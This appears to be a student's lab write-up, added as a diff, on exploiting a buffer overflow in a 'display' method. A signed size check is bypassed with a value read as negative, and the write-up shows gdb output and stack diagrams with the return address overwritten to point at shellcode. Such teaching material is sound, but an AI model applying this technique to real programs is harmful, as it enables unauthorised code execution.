@@ -1,0 +1,70 @@
+Similar to q1, the vulnerability for this file was a buffer overflow exploit.
+The method 'fread' in class method 'display' innately does not bound check when
+loading into a buffer; however, the user naively uses rudimentary bound checking
+to make sure the size of the input is less than 128. This could be exploited by
+making your file pass in a big positive  number that is interpreted as negative
+by two's complement.
+
+12        size_t n = fread(&size, 1, 1, file);
+(gdb) i locals
+msg = '\000' <repeats 127 times>
+size = 0 '\000'
+file = 0x804b008
+n = 134520832
+(gdb) step
+13        if (n == 0 || size > 128)
+(gdb) i locals
+msg = '\000' <repeats 127 times>
+size = -65 '\277'
+file = 0x804b008
+n = 1
+(gdb)
+
+Other than that, similar to q1, I used gdb to find ebp and the buffer address to
+determine the number of junk values to pad the shell address and also the return
+address (which happened to be the buffer address since the buffer was big enough
+to hold 45 characters)
+
+Stack BEFORE:
+|0xbffff8c5|
+|----------|
+|0x0804857b|<-rip
+|----------|
+|0xbffff728|<-ebp
+|----------|
+|0xbffff7c4|
+|----------|
+|0x00000002|
+|----------|
+|0x0804b008|
+|----------|
+|0x0000007a|
+|----------|
+|msg buffer|
+      .
+      .
+      .
+
+Stack AFTER:
+|0xbffff8cd|
+|----------|
+|0xbffff678|<-rip
+|----------|
+|0x41414141|<-ebp
+|----------|
+|0x41414141|
+|----------|
+|0x41414141|
+|----------|
+|0x41414141|
+|----------|
+|0x00000098|
+|----------|
+|0x41414141|
+      .
+      .
+      .
+|shellcode |<-addr = 0xbffff678
+      .
+      .
+      .
